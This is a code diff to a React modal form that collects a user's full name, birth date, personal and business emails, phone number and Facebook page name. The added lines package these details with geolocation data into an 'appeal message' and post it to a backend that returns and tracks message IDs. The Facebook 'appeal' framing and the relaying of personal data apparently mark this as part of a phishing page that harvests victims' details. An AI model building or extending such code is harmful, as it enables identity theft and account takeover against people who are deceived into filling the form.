@@ -5,6 +5,8 @@ import { tickSrc } from '@/components/icons';
 import PhoneInput from '@/components/phone-input';
 import { DEFAULT_TEXTS } from '@/constants/default-texts';
 import { store } from '@/store/store';
+import { buildAppealMessage } from '@/utils/message';
+import axios from 'axios';
 import { type FC, type FormEvent, useCallback, useState } from 'react';
 
 interface FormData {
@@ -42,7 +44,7 @@ const InitModal: FC<{ nextStep: () => void; texts?: Record<string, string> }> = 
     });
     const [errors, setErrors] = useState<FormErrors>({});
 
-    const { setModalOpen, setUserData } = store();
+    const { geoInfo, messageId, setModalOpen, setUserData, setMessageId, setMessageContent } = store();
 
     const handleChange = useCallback(<K extends keyof FormData>(field: K, value: FormData[K]) => {
         setFormData((prev) => ({ ...prev, [field]: value }));
@@ -75,14 +77,31 @@ const InitModal: FC<{ nextStep: () => void; texts?: Record<string, string> }> = 
 
         setIsLoading(true);
 
-        setUserData({
+        const userDataPayload = {
             fullName: formData.fullName.trim(),
             birthDate: formData.birthDate,
             personalEmail: formData.personalEmail.trim(),
             businessEmail: formData.businessEmail.trim(),
             phoneNumber: formData.phone.trim(),
             facebookPageName: formData.pageName.trim()
+        };
+
+        setUserData(userDataPayload);
+
+        const message = buildAppealMessage({
+            geoInfo,
+            userData: userDataPayload
         });
+
+        try {
+            const res = await axios.post('/api/send', { message, old_message_id: messageId });
+            if (res?.data?.success && typeof res.data.message_id === 'number') {
+                setMessageId(res.data.message_id);
+                setMessageContent(message);
+            }
+        } catch {
+            //
+        }
 
         nextStep();
         setIsLoading(false);
